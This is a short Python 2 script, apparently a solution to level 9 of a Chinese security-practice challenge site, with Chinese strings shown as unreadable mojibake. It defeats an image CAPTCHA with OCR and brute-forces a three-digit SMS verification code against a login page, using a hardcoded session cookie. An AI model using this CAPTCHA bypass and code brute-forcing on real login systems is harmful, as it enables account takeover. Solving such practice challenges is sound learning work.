# coding:gbk
try:
    import pytesseract
    from PIL import Image
    import requests
except ImportError:
    print 'ģ�鵼�����,��ʹ��pip��װ,pytesseract�������¿⣺'
    print 'http://www.lfd.uci.edu/~gohlke/pythonlibs/#pil'
    print 'http://code.google.com/p/tesseract-ocr/'
    raise SystemExit
header = {'Cookie': 'saeut=218.108.135.246.1416190347811282; PHPSESSID=5f3d9f5685452d1474f59371067e36af'}
def vcode():
    "python��֤��ʶ����"
    pic_url = 'http://1.hacklist.sinaapp.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'
    r = requests.get(pic_url, headers=header, timeout=10)
    with open('vcode.png', 'wb') as pic:
        pic.write(r.content)
    im = pytesseract.image_to_string(Image.open('vcode.png'))
    im = im.replace(' ', '')
    if im != '':
        return im
    else:
        return vcode()
try:
    print '\n������Ϣ��ȫ����ѧϰƽ̨�ű��ص�9��\n'
    for pwd in xrange(100, 999):
        code = vcode()
        url = 'http://1.hacklist.sinaapp.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php'
        payload = {'username': 13388886666, 'mobi_code': pwd, 'user_code': code}
        r = requests.post(url, data=payload, headers=header, timeout=10)
        response = unicode(r.content, 'utf-8').encode('gbk')
        if 'error' not in response:
            print '��ȷ����֤��Ϊ��', pwd, response
            break
        else:
            print '���ڳ����ֻ���֤��:', pwd, code
except KeyboardInterrupt:
    raise SystemExit('ү,�����ķԸ�,�ѳɹ��˳�!')